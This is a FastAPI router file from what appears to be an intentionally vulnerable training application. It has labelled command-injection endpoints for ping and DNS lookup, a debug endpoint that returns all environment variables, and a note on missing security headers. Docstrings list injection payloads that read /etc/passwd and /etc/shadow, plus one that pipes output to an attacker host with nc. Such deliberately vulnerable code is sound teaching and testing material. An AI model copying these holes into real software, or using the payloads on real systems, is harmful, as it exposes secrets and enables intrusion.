"""Tools router with Command Injection vulnerability."""

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from typing import Optional

from app.models import User
from app.vulnerabilities import (
    get_current_user_required,
    ping_host_vulnerable,
    dns_lookup_vulnerable,
)

router = APIRouter()


class PingRequest(BaseModel):
    """Request model for ping."""
    host: str


class DnsRequest(BaseModel):
    """Request model for DNS lookup."""
    domain: str


@router.post("/tools/ping")
async def ping_host(
    request: PingRequest,
    current_user: User = Depends(get_current_user_required),
):
    """
    Ping a host.

    VULNERABILITY V07 (Command Injection): Host is passed directly to shell

    Exploit examples:
    - {"host": "127.0.0.1; cat /etc/passwd"}
    - {"host": "127.0.0.1 && whoami"}
    - {"host": "127.0.0.1; ls -la /"}
    - {"host": "$(cat /etc/passwd)"}
    - {"host": "127.0.0.1 | nc attacker.com 1234"}
    """
    result = ping_host_vulnerable(request.host)

    # VULNERABILITY V10: No logging of potentially malicious activity
    return result


@router.post("/tools/dns")
async def dns_lookup(
    request: DnsRequest,
    current_user: User = Depends(get_current_user_required),
):
    """
    DNS lookup.

    VULNERABILITY V07: Another command injection vector

    Exploit examples:
    - {"domain": "google.com; id"}
    - {"domain": "google.com && cat /etc/shadow"}
    """
    result = dns_lookup_vulnerable(request.domain)
    return result


@router.get("/tools/debug")
async def debug_info():
    """
    Debug endpoint.

    VULNERABILITY V08: Exposes sensitive debug information
    Should be disabled in production
    """
    import os
    import sys

    return {
        "python_version": sys.version,
        "platform": sys.platform,
        "cwd": os.getcwd(),
        "env_vars": dict(os.environ),  # VULNERABILITY: Exposing all env vars!
        "path": sys.path,
    }


@router.get("/tools/headers")
async def show_headers():
    """
    Show security headers info.

    This endpoint helps demonstrate V08 (Security Misconfiguration)
    """
    return {
        "message": "Check the response headers",
        "expected_headers": [
            "X-Content-Type-Options: nosniff",
            "X-Frame-Options: DENY",
            "X-XSS-Protection: 1; mode=block",
            "Strict-Transport-Security: max-age=31536000",
            "Content-Security-Policy: default-src 'self'",
        ],
        "note": "These headers are NOT set (vulnerability V08)"
    }
